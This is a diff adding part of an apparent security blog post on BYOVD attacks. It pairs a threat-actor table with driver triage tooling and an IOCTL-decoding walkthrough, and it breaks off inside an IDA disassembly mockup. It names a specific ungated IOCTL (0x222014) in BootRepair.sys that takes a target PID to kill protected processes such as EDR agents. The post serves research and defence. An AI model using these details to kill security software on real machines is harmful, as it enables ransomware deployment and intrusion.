+<p>BYOVD is no longer a theoretical technique. Ransomware operators and nation-state actors have integrated it into mainstream kill chains:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Threat Actor / Malware</th>
+      <th>Vulnerable Driver Used</th>
+      <th>Technique</th>
+      <th>Source</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>BlackCat / ALPHV</td>
+      <td><a href="https://www.loldrivers.io/"><code class="language-plaintext highlighter-rouge">ktgn.sys</code></a> (anti-cheat driver)</td>
+      <td>EDR termination before encryption</td>
+      <td><a href="https://www.trendmicro.com/en_us/research/23/h/blackcat-ransomware-deploys-new-signed-kernel-driver.html">Trend Micro (2023)</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://attack.mitre.org/groups/G0032/">Lazarus Group</a></td>
+      <td><a href="https://www.loldrivers.io/"><code class="language-plaintext highlighter-rouge">dell_bios.sys</code></a> (Dell BIOS update)</td>
+      <td>Arbitrary kernel write → DSE disable</td>
+      <td><a href="https://www.welivesecurity.com/2022/01/11/signed-kernel-drivers-unguarded-gateway-windows-core/">ESET (2022)</a></td>
+    </tr>
+    <tr>
+      <td>RobbinHood ransomware</td>
+      <td><a href="https://www.loldrivers.io/"><code class="language-plaintext highlighter-rouge">gdrv.sys</code></a> (Gigabyte utility)</td>
+      <td>EDR termination → unrestricted deployment</td>
+      <td><a href="https://news.sophos.com/en-us/2019/04/09/robinhood-ransomware-takes-a-different-approach/">Sophos (2019)</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://attack.mitre.org/groups/G1015/">Scattered Spider</a></td>
+      <td><a href="https://www.loldrivers.io/"><code class="language-plaintext highlighter-rouge">truesight.sys</code></a> (RealTek)</td>
+      <td>AV kill before SIM-swap pivot</td>
+      <td><a href="https://www.crowdstrike.com/blog/scattered-spider-attempts-to-avoid-detection-with-bring-your-own-vulnerable-driver-tactic/">CrowdStrike (2023)</a></td>
+    </tr>
+    <tr>
+      <td>Cuba ransomware</td>
+      <td><a href="https://www.loldrivers.io/"><code class="language-plaintext highlighter-rouge">ApcHelper.sys</code></a> (leaked MSI driver)</td>
+      <td>Callback removal → payload delivery</td>
+      <td><a href="https://securelist.com/cuba-ransomware/110533/">Kaspersky (2022)</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redteamfortress/PhantomKiller">PhantomKiller (PoC 2026)</a></td>
+      <td><a href="https://www.loldrivers.io/"><code class="language-plaintext highlighter-rouge">BootRepair.sys</code></a> (Lenovo PC Manager)</td>
+      <td>Zero-DACL device → PID-targeted kill</td>
+      <td><a href="https://github.com/redteamfortress/PhantomKiller">GitHub PoC</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The pattern is consistent: Phase 4 (Defense Evasion) of the ransomware kill chain maps directly to BYOVD. An operator who can terminate the EDR agent before deploying the encryption payload gains minutes of unobserved execution time, typically all that is needed.</p>
+
+<hr>
+
+<h2 id="phase-1-driver-triage">Phase 1: Driver Triage</h2>
+
+<p>Before a driver can be weaponised, it must be identified. The triage question is: does this driver expose a user-reachable kernel primitive with insufficient caller validation?</p>
+
+<h3 id="static-import-scanning">Static Import Scanning</h3>
+
+<p>The fastest first-pass filter is the driver’s import table. A driver that imports <code class="language-plaintext highlighter-rouge">ZwTerminateProcess</code>, <code class="language-plaintext highlighter-rouge">MmMapIoSpace</code>, <code class="language-plaintext highlighter-rouge">ZwWriteVirtualMemory</code>, or similar functions is a candidate for closer examination. These are the kernel functions that give BYOVD its power, and their presence in a signed driver is a red flag.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Import</th>
+      <th>Exploit primitive</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">ZwTerminateProcess</code></td>
+      <td>Kill any process including PPL</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">MmMapIoSpace</code></td>
+      <td>Map physical memory → arbitrary kernel R/W</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">ZwWriteVirtualMemory</code></td>
+      <td>Cross-process memory write</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">PsLookupProcessByProcessId</code></td>
+      <td>Resolve EPROCESS from PID (prerequisite for above)</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">ObOpenObjectByPointer</code></td>
+      <td>Obtain handle from kernel object pointer</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">ZwSetSystemInformation</code></td>
+      <td>Driver blacklist / callback manipulation</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">MmCopyMemory</code></td>
+      <td>Arbitrary physical read</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="drveye-automated-driver-triage-at-scale">DrvEye: Automated Driver Triage at Scale</h3>
+
+<p>Manual analysis does not scale. <a href="https://github.com/0xDbgMan/DrvEye">DrvEye</a> by 0xDbgMan automates the entire triage pipeline:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight-wrapper"><div class="highlight"><pre class="highlight"><code>pip <span class="nb">install </span>pefile capstone cryptography unicorn yara-python
+
+python3 DrvEye.py BootRepair.sys <span class="se">\</span>
+    <span class="nt">--live-check</span> <span class="se">\</span>
+    <span class="nt">--loldrivers</span> <span class="se">\</span>
+    <span class="nt">--json</span> report.json <span class="se">\</span>
+    <span class="nt">--ida</span> BootRepair_annotations.py <span class="se">\</span>
+    <span class="nt">--save-pocs</span> <span class="se">\</span>
+    <span class="nt">--verbose</span>
+</code></pre></div><button class="copy-code-button" type="button">
+      <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path>
+        <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
+      </svg>
+      Copy
+    </button></div></div>
+
+<p>DrvEye’s load verdict matrix:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight-wrapper"><div class="highlight"><pre class="highlight"><code>─── LOAD VERDICT ───
+  Default Win10/11         : WILL LOAD
+  Secure Boot + DSE        : WILL LOAD
+  HVCI / Memory Integrity  : WILL NOT LOAD
+      • FORCE_INTEGRITY flag not set
+      • W+X section present
+  Test-signing mode        : WILL LOAD
+  S Mode                   : WILL NOT LOAD
+</code></pre></div><button class="copy-code-button" type="button">
+      <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path>
+        <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
+      </svg>
+      Copy
+    </button></div></div>
+
+<p>DrvEye’s IOCTL surface output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight-wrapper"><div class="highlight"><pre class="highlight"><code>[*] Detected IOCTL codes:
+    0x222014  @0x14000198C  (BUFFERED, FILE_ANY_ACCESS)
+              → process-kill
+              [!!PPL BYPASS] [UNGATED-sink]
+              bugs=process-kill,missing-probe
+</code></pre></div><button class="copy-code-button" type="button">
+      <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path>
+        <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
+      </svg>
+      Copy
+    </button></div></div>
+
+<p>With <code class="language-plaintext highlighter-rouge">--save-pocs</code>, DrvEye emits a compilable C <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> skeleton per IOCTL. With <code class="language-plaintext highlighter-rouge">--loldrivers</code>, it pulls current feeds from LOLDrivers, MalwareBazaar, and Hybrid Analysis. With <code class="language-plaintext highlighter-rouge">--ida</code>, it generates an IDA Python annotation script you can execute directly in the disassembler.</p>
+
+<hr>
+
+<h2 id="phase-2-ioctl-anatomy">Phase 2: IOCTL Anatomy</h2>
+
+<p>When a Windows driver calls <code class="language-plaintext highlighter-rouge">IoCreateDevice</code> during <code class="language-plaintext highlighter-rouge">DriverEntry</code>, it exposes a named device object that user-mode processes can open with <code class="language-plaintext highlighter-rouge">CreateFile("\\.\DeviceName")</code>. Any caller holding a valid handle can then send commands by calling <code class="language-plaintext highlighter-rouge">DeviceIoControl</code>, passing a 32-bit control code called an <strong>IOCTL</strong> together with optional input and output buffers. The kernel wraps this call into an <strong>IRP</strong> (I/O Request Packet) and routes it to the driver’s <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code> handler, registered at <code class="language-plaintext highlighter-rouge">MajorFunction[14]</code> in the driver object.</p>
+
+<p>Every IOCTL packs four fields into a single 32-bit integer: the device type, a caller access level, a vendor-assigned function number, and a buffer transfer method. The access field is the security gate: <code class="language-plaintext highlighter-rouge">FILE_ANY_ACCESS</code> (value <code class="language-plaintext highlighter-rouge">0</code>) disables that gate entirely, meaning the kernel performs no privilege check before dispatching the request. This single missing check is the architectural flaw that makes <code class="language-plaintext highlighter-rouge">BootRepair.sys</code> exploitable from any administrative process.</p>
+
+<!-- ============================================================
+     DIAGRAM 2 — IOCTL Bit-Field Anatomy
+     ============================================================ -->
+<div style="margin:2rem 0;overflow-x:auto;">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 860 320" width="100%" style="max-width:860px;display:block;margin:0 auto;font-family:'Courier New',monospace;">
+  <rect width="860" height="320" fill="#0d1117" rx="10"></rect>
+  <rect width="860" height="320" fill="none" stroke="#30363d" stroke-width="1.5" rx="10"></rect>
+  <text x="430" y="28" font-size="14" fill="#e6edf3" text-anchor="middle" font-weight="bold">IOCTL Code Anatomy — CTL_CODE Macro Decoded</text>
+  <text x="430" y="46" font-size="10" fill="#8b949e" text-anchor="middle">32-bit control code passed to DeviceIoControl() — example: 0x222014 (BootRepair.sys)</text>
+
+  <!-- bit ruler -->
+  <rect x="40" y="58" width="390" height="42" fill="#1a2980" rx="3" stroke="#2980b9"></rect>
+  <text x="235" y="75" font-size="11" fill="#aed6f1" text-anchor="middle" font-weight="bold">DeviceType</text>
+  <text x="235" y="91" font-size="10" fill="#85c1e9" text-anchor="middle">bits 31:16 — 16 bits — 0x0022 = FILE_DEVICE_UNKNOWN</text>
+
+  <rect x="430" y="58" width="50" height="42" fill="#6c3483" rx="3" stroke="#7d3c98"></rect>
+  <text x="455" y="75" font-size="9" fill="#d7bde2" text-anchor="middle" font-weight="bold">Access</text>
+  <text x="455" y="91" font-size="8" fill="#c39bd3" text-anchor="middle">15:14 · 0x0</text>
+
+  <rect x="480" y="58" width="25" height="42" fill="#154360" rx="3" stroke="#1a5276"></rect>
+  <text x="492" y="75" font-size="8" fill="#85c1e9" text-anchor="middle">Cust</text>
+  <text x="492" y="91" font-size="7" fill="#85c1e9" text-anchor="middle">bit 13</text>
+
+  <rect x="505" y="58" width="268" height="42" fill="#1e5631" rx="3" stroke="#27ae60"></rect>
+  <text x="639" y="75" font-size="11" fill="#82e0aa" text-anchor="middle" font-weight="bold">Function Code</text>
+  <text x="639" y="91" font-size="10" fill="#76d7a3" text-anchor="middle">bits 12:2 — 11 bits — 0x805 (vendor-defined)</text>
+
+  <rect x="773" y="58" width="49" height="42" fill="#7b241c" rx="3" stroke="#e74c3c"></rect>
+  <text x="797" y="75" font-size="9" fill="#f1948a" text-anchor="middle" font-weight="bold">Method</text>
+  <text x="797" y="91" font-size="8" fill="#f1948a" text-anchor="middle">1:0 · 0x0</text>
+
+  <!-- bit labels -->
+  <text x="42" y="55" font-size="8" fill="#566573">31</text>
+  <text x="416" y="55" font-size="8" fill="#566573">16</text>
+  <text x="431" y="55" font-size="8" fill="#566573">15</text>
+  <text x="474" y="55" font-size="8" fill="#566573">14</text>
+  <text x="481" y="55" font-size="8" fill="#566573">13</text>
+  <text x="507" y="55" font-size="8" fill="#566573">12</text>
+  <text x="760" y="55" font-size="8" fill="#566573">2</text>
+  <text x="774" y="55" font-size="8" fill="#566573">1</text>
+  <text x="814" y="55" font-size="8" fill="#566573">0</text>
+
+  <!-- CTL_CODE macro -->
+  <rect x="40" y="115" width="390" height="90" fill="#0d1117" rx="5" stroke="#30363d"></rect>
+  <text x="55" y="133" font-size="11" fill="#e6edf3" font-weight="bold">CTL_CODE Macro (WDK — wdm.h)</text>
+  <text x="55" y="150" font-size="10" fill="#c39bd3">#define CTL_CODE(DevType, Func, Method, Access) \</text>
+  <text x="55" y="165" font-size="10" fill="#c39bd3">  ((DevType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | \</text>
+  <text x="55" y="180" font-size="10" fill="#c39bd3">  ((Func) &lt;&lt; 2) | (Method)</text>
+  <text x="55" y="197" font-size="10" fill="#82e0aa">// BootRepair.sys: CTL_CODE(0x22, 0x805, 0, 0) = 0x222014</text>
+
+  <!-- Method values -->
+  <rect x="450" y="115" width="372" height="90" fill="#0d1117" rx="5" stroke="#30363d"></rect>
+  <text x="465" y="133" font-size="11" fill="#e6edf3" font-weight="bold">Transfer Method (bits 1:0)</text>
+  <text x="465" y="150" font-size="10" fill="#e59866">0 = METHOD_BUFFERED     I/O system copies via buffer</text>
+  <text x="465" y="165" font-size="10" fill="#7f8c8d">1 = METHOD_IN_DIRECT    MDL for input</text>
+  <text x="465" y="180" font-size="10" fill="#7f8c8d">2 = METHOD_OUT_DIRECT   MDL for output</text>
+  <text x="465" y="195" font-size="10" fill="#7f8c8d">3 = METHOD_NEITHER      raw user pointers (dangerous)</text>
+
+  <!-- Access field values -->
+  <rect x="40" y="218" width="390" height="88" fill="#0d1117" rx="5" stroke="#30363d"></rect>
+  <text x="55" y="236" font-size="11" fill="#e6edf3" font-weight="bold">Access Field (bits 15:14) — Gating Check</text>
+  <text x="55" y="253" font-size="10" fill="#e74c3c">0x0 = FILE_ANY_ACCESS     ← BootRepair.sys — UNGATED</text>
+  <text x="55" y="268" font-size="10" fill="#7f8c8d">0x1 = FILE_READ_ACCESS    caller needs read access</text>
+  <text x="55" y="283" font-size="10" fill="#7f8c8d">0x2 = FILE_WRITE_ACCESS   caller needs write access</text>
+  <text x="55" y="298" font-size="10" fill="#27ae60">FILE_ANY_ACCESS = no handle privilege check enforced</text>
+
+  <!-- Binary breakdown -->
+  <rect x="450" y="218" width="372" height="88" fill="#0d1117" rx="5" stroke="#30363d"></rect>
+  <text x="465" y="236" font-size="11" fill="#e6edf3" font-weight="bold">0x222014 Decoded</text>
+  <text x="465" y="253" font-size="10" fill="#8b949e">Binary: 0010 0010 0010 0000 0001 0000 0001 0100</text>
+  <text x="465" y="268" font-size="10" fill="#aed6f1">DevType: 0x0022  Access: 0x0  Func: 0x805  Mth: 0x0</text>
+  <text x="465" y="284" font-size="10" fill="#f0b27a">Input buffer: 4 bytes — DWORD PID of target process</text>
+  <text x="465" y="299" font-size="10" fill="#e74c3c">No DACL · FILE_ANY_ACCESS · METHOD_BUFFERED</text>
+
+  <text x="430" y="314" font-size="8" fill="#2d3436" text-anchor="middle">benjitrapp.github.io · IOCTL Anatomy · T1068 / T1562.001 🦝</text>
+</svg>
+</div>
+
+<h3 id="the-ctl_code-macro">The CTL_CODE Macro</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight-wrapper"><div class="highlight"><pre class="highlight"><code><span class="c1">// Windows Driver Kit — wdm.h</span>
+<span class="cp">#define CTL_CODE(DeviceType, Function, Method, Access) \
+    (((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method))
+</span></code></pre></div><button class="copy-code-button" type="button">
+      <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path>
+        <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
+      </svg>
+      Copy
+    </button></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Field</th>
+      <th>Bits</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">DeviceType</code></td>
+      <td>31:16</td>
+      <td><code class="language-plaintext highlighter-rouge">0x22</code> = <code class="language-plaintext highlighter-rouge">FILE_DEVICE_UNKNOWN</code>, common in exploitable drivers</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">Access</code></td>
+      <td>15:14</td>
+      <td><code class="language-plaintext highlighter-rouge">0x0</code> = <code class="language-plaintext highlighter-rouge">FILE_ANY_ACCESS</code>. No access check enforced. This is the key gating failure.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">Function</code></td>
+      <td>12:2</td>
+      <td>Vendor-assigned. Values <code class="language-plaintext highlighter-rouge">0x800+</code> are vendor-defined, not Microsoft-reserved</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">Method</code></td>
+      <td>1:0</td>
+      <td><code class="language-plaintext highlighter-rouge">0</code> = <code class="language-plaintext highlighter-rouge">METHOD_BUFFERED</code>; kernel copies PID via I/O system buffer</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The Python utility below decodes any 32-bit control code into its four constituent fields and flags whether the function number is vendor-defined. Paste it into a REPL while triaging a candidate driver.</p>
+
+<div class="ghidra-mock" style="overflow-x:auto;">
+  <div class="gm-bar">
+    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
+    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">ioctl_decoder.py — Python 3.x</span>
+  </div>
+  <div style="padding:16px 22px 18px;font-family:'Courier New',monospace;font-size:12.5px;line-height:1.9;">
+    <div><span style="color:#484f58;"># CTL_CODE field lookup tables</span></div>
+    <div><span style="color:#a78bfa;">METHOD</span><span style="color:#8b949e;"> = [</span><span style="color:#17fe33;">"BUFFERED"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"IN_DIRECT"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"OUT_DIRECT"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"NEITHER"</span><span style="color:#8b949e;">]</span></div>
+    <div><span style="color:#a78bfa;">ACCESS</span><span style="color:#8b949e;">  = [</span><span style="color:#17fe33;">"FILE_ANY_ACCESS"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"FILE_READ_ACCESS"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"FILE_WRITE_ACCESS"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"READ+WRITE"</span><span style="color:#8b949e;">]</span></div>
+    <div style="margin-top:8px;"><span style="color:#60a5fa;">def </span><span style="color:#fbbf24;">decode_ioctl</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">code</span><span style="color:#8b949e;">: int) -&gt; dict:</span></div>
+    <div style="margin-left:20px;"><span style="color:#60a5fa;">return </span><span style="color:#8b949e;">{</span></div>
+    <div style="margin-left:40px;"><span style="color:#17fe33;">"device_type"</span><span style="color:#8b949e;">: </span><span style="color:#fbbf24;">hex</span><span style="color:#8b949e;">((</span><span style="color:#f97316;">code</span><span style="color:#8b949e;"> &gt;&gt; </span><span style="color:#f97316;">16</span><span style="color:#8b949e;">) &amp; </span><span style="color:#f97316;">0xFFFF</span><span style="color:#8b949e;">),</span></div>
+    <div style="margin-left:40px;"><span style="color:#17fe33;">"access"</span><span style="color:#8b949e;">:      </span><span style="color:#a78bfa;">ACCESS</span><span style="color:#8b949e;">[(</span><span style="color:#f97316;">code</span><span style="color:#8b949e;"> &gt;&gt; </span><span style="color:#f97316;">14</span><span style="color:#8b949e;">) &amp; </span><span style="color:#f97316;">0x3</span><span style="color:#8b949e;">],</span></div>
+    <div style="margin-left:40px;"><span style="color:#17fe33;">"function"</span><span style="color:#8b949e;">:    </span><span style="color:#fbbf24;">hex</span><span style="color:#8b949e;">((</span><span style="color:#f97316;">code</span><span style="color:#8b949e;"> &gt;&gt; </span><span style="color:#f97316;">2</span><span style="color:#8b949e;">) &amp; </span><span style="color:#f97316;">0xFFF</span><span style="color:#8b949e;">),</span></div>
+    <div style="margin-left:40px;"><span style="color:#17fe33;">"method"</span><span style="color:#8b949e;">:     </span><span style="color:#60a5fa;">f</span><span style="color:#17fe33;">"METHOD_{</span><span style="color:#a78bfa;">METHOD</span><span style="color:#8b949e;">[</span><span style="color:#f97316;">code</span><span style="color:#8b949e;"> &amp; </span><span style="color:#f97316;">0x3</span><span style="color:#8b949e;">]</span><span style="color:#17fe33;">}"</span><span style="color:#8b949e;">,</span></div>
+    <div style="margin-left:40px;"><span style="color:#17fe33;">"vendor"</span><span style="color:#8b949e;">:     (</span><span style="color:#f97316;">code</span><span style="color:#8b949e;"> &gt;&gt; </span><span style="color:#f97316;">2</span><span style="color:#8b949e;">) &amp; </span><span style="color:#f97316;">0xFFF</span><span style="color:#8b949e;"> &gt;= </span><span style="color:#f97316;">0x800</span><span style="color:#8b949e;">,</span></div>
+    <div style="margin-left:20px;"><span style="color:#8b949e;">}</span></div>
+    <div style="margin-top:10px;padding-top:10px;border-top:1px solid #21262d;"><span style="color:#484f58;">&gt;&gt;&gt; </span><span style="color:#fbbf24;">decode_ioctl</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">0x222014</span><span style="color:#8b949e;">)</span></div>
+    <div><span style="color:#8b949e;">{</span></div>
+    <div style="margin-left:20px;"><span style="color:#17fe33;">'device_type'</span><span style="color:#8b949e;">: </span><span style="color:#17fe33;">'0x22'</span><span style="color:#8b949e;">,</span><span style="color:#484f58;">      # FILE_DEVICE_UNKNOWN</span></div>
+    <div style="margin-left:20px;"><span style="color:#17fe33;">'access'</span><span style="color:#8b949e;">:      </span><span style="color:#ef4444;">'FILE_ANY_ACCESS'</span><span style="color:#8b949e;">,</span><span style="color:#484f58;">   # no caller check enforced</span></div>
+    <div style="margin-left:20px;"><span style="color:#17fe33;">'function'</span><span style="color:#8b949e;">:    </span><span style="color:#17fe33;">'0x805'</span><span style="color:#8b949e;">,</span><span style="color:#484f58;">           # vendor-defined (&gt;= 0x800)</span></div>
+    <div style="margin-left:20px;"><span style="color:#17fe33;">'method'</span><span style="color:#8b949e;">:     </span><span style="color:#17fe33;">'METHOD_BUFFERED'</span><span style="color:#8b949e;">,</span></div>
+    <div style="margin-left:20px;"><span style="color:#17fe33;">'vendor'</span><span style="color:#8b949e;">:     </span><span style="color:#60a5fa;">True</span></div>
+    <div><span style="color:#8b949e;">}</span></div>
+  </div>
+</div>
+
+<hr>
+
+<h3 id="reversing-ioctls-in-ida-pro">Reversing IOCTLs in IDA Pro</h3>
+
+<!-- ============================================================
+     DIAGRAM 3a — IDA Pro IOCTL RE Workflow Mockup
+     ============================================================ -->
+<div style="margin:2rem 0;overflow-x:auto;">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 540" width="100%" style="max-width:900px;display:block;margin:0 auto;font-family:'Courier New',monospace;">
+  <rect width="900" height="540" fill="#1e1f29" rx="10"></rect>
+  <!-- IDA title bar -->
+  <rect width="900" height="28" fill="#2d2d3f" rx="10"></rect>
+  <rect x="0" y="14" width="900" height="14" fill="#2d2d3f"></rect>
+  <circle cx="16" cy="14" r="6" fill="#ff5f57"></circle>
+  <circle cx="36" cy="14" r="6" fill="#ffbd2e"></circle>
+  <circle cx="56" cy="14" r="6" fill="#28c840"></circle>
+  <text x="450" y="19" font-size="11" fill="#a0a0b0" text-anchor="middle">IDA Pro 9.0 — BootRepair.sys [AMD64]</text>
+
+  <!-- Menu bar -->
+  <rect x="0" y="28" width="900" height="22" fill="#252535"></rect>
+  <text x="10" y="43" font-size="10" fill="#8080a0">File  Edit  Jump  Search  View  Debugger  Options  Windows  Help</text>
+
+  <!-- Tabs -->
+  <rect x="0" y="50" width="900" height="20" fill="#1e1f29"></rect>
+  <rect x="0" y="50" width="120" height="20" fill="#2a2b3d" stroke="#5c5c7a" stroke-width="1"></rect>
+  <text x="60" y="63" font-size="10" fill="#c8c8e8" text-anchor="middle">IDA View-A</text>
+  <rect x="122" y="50" width="100" height="20" fill="#1e1f29"></rect>
+  <text x="172" y="63" font-size="10" fill="#606080" text-anchor="middle">Imports</text>
+  <rect x="224" y="50" width="120" height="20" fill="#1e1f29"></rect>
+  <text x="284" y="63" font-size="10" fill="#606080" text-anchor="middle">Strings</text>
+  <rect x="346" y="50" width="130" height="20" fill="#1e1f29"></rect>
+  <text x="411" y="63" font-size="10" fill="#606080" text-anchor="middle">Functions</text>
+
+  <!-- Step labels on left side -->
+  <rect x="0" y="70" width="38" height="462" fill="#16172080"></rect>
+  <text x="19" y="120" font-size="8" fill="#e74c3c" text-anchor="middle" transform="rotate(-90,19,120)">STEP 1 — imports</text>
+  <text x="19" y="235" font-size="8" fill="#e67e22" text-anchor="middle" transform="rotate(-90,19,235)">STEP 2 — xrefs</text>
+  <text x="19" y="350" font-size="8" fill="#f1c40f" text-anchor="middle" transform="rotate(-90,19,350)">STEP 3 — dispatch</text>
+  <text x="19" y="460" font-size="8" fill="#27ae60" text-anchor="middle" transform="rotate(-90,19,460)">STEP 4 — DriverEntry</text>
+
+  <!-- Main disassembly pane -->
+  <rect x="38" y="70" width="580" height="462" fill="#1a1b2a"></rect>
+
+  <!-- Step 1: Imports window showing dangerous imports -->
+  <rect x="46" y="78" width="564" height="95" fill="#141525" rx="3" stroke="#3a3a5c" stroke-width="1"></rect>
+  <text x="55" y="94" font-size="9" fill="#6060a0">; ── Imports (ntoskrnl.exe) ── press X on function to xref ──────────────────</text>
+  <text x="55" y="110" font-size="10" fill="#6688cc">.idata:FFFFF80000012010  </text><text x="220" y="110" font-size="10" fill="#e74c3c">ZwTerminateProcess</text><text x="380" y="110" font-size="10" fill="#5c8c5c"> ; ← START HERE</text>
+  <text x="55" y="125" font-size="10" fill="#6688cc">.idata:FFFFF80000012018  </text><text x="220" y="125" font-size="10" fill="#e67e22">PsLookupProcessByProcessId</text>
+  <text x="55" y="140" font-size="10" fill="#6688cc">.idata:FFFFF80000012020  </text><text x="220" y="140" font-size="10" fill="#e67e22">ObOpenObjectByPointer</text>
+  <text x="55" y="155" font-size="10" fill="#6688cc">.idata:FFFFF80000012028  </text><text x="220" y="155" font-size="10" fill="#808080">IoCreateDevice</text>
+  <text x="55" y="163" font-size="9" fill="#3a3a6a">; Press [X] on ZwTerminateProcess → shows 1 call site → sub_14000198C</text>
+
+  <!-- Step 2: Xref / termination handler -->
+  <rect x="46" y="178" width="564" height="115" fill="#141525" rx="3" stroke="#3a3a5c" stroke-width="1"></rect>
+  <text x="55" y="194" font-size="9" fill="#6060a0">; ── sub_14000198C — termination routine (xref target) ─────────────────────</text>
+  <text x="55" y="210" font-size="10" fill="#c678dd">sub_14000198C  proc near</text>
+  <text x="55" y="225" font-size="10" fill="#61afef">  mov     </text><text x="120" y="225" font-size="10" fill="#e06c75">rcx, [rsp+8]        </text><text x="295" y="225" font-size="10" fill="#5c8c5c">; PID from SystemBuffer</text>
+  <text x="55" y="240" font-size="10" fill="#61afef">  call    </text><text x="120" y="240" font-size="10" fill="#e67e22">PsLookupProcessByProcessId</text><text x="350" y="240" font-size="10" fill="#5c8c5c"> ; → PEPROCESS*</text>
+  <text x="55" y="255" font-size="10" fill="#61afef">  call    </text><text x="120" y="255" font-size="10" fill="#e67e22">ObOpenObjectByPointer   </text><text x="335" y="255" font-size="10" fill="#5c8c5c"> ; → hProcess</text>
